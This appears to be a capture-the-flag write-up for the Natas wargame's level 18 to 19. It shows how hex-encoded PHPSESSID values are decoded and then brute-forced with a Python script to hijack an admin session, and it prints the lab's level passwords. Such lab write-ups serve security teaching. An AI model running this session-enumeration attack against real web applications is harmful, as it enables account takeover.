## Level18 -> Level19


Similar to the previous level, but the challenge description tells us that session IDs are no longer sequential.


The username and password form with a login button is given as usual.


The page source doesn't guide you any meaningful information this time. 


Frankly speaking, I don't even think there is a source code. 


Let's try submitting any value for username and password. 


I entered `admin` for username and `1` for password. 


Let's check the `PHPSESSID` in devtools. 


`3337392d61646d696e` is set for the `PHPESESSID` value. 


If you decode the hexadecimal string to bytes you'll get a plaintext. 


```python 
bytes.fromhex('3337392d61646d696e')
b'379-admin'
```


From decoding the `PHPSESSID` value we now know that `PHPSESSID` is a hexadecimal representation which follows the following format `number-admin`.


What if we brute forced the hex value of `1-admin` ~ `640-admin`, wouldn't one of them be the password. 


Let's give it a shot. 


```python
from requests.auth import HTTPBasicAuth
import requests
import re

USERNAME = 'natas19'
URL = f'http://{USERNAME}.natas.labs.overthewire.org/'
PW = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
session = requests.Session()
session.auth = HTTPBasicAuth(USERNAME, PW)

for i in range(1, 641):
    cookies = {'PHPSESSID': f'{i}-admin'.encode('utf-8').hex()}
    res = session.post(URL, cookies=cookies)
    print(f'Trying session id: {i}')
    if 'You are an admin' in res.text:
        print(i, res.text)
        print(re.findall('<pre>(.*?)</pre>', res.text, re.DOTALL)[0])
        break

# Username: natas20
# Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
```


After waiting for a bit, you'll get the password.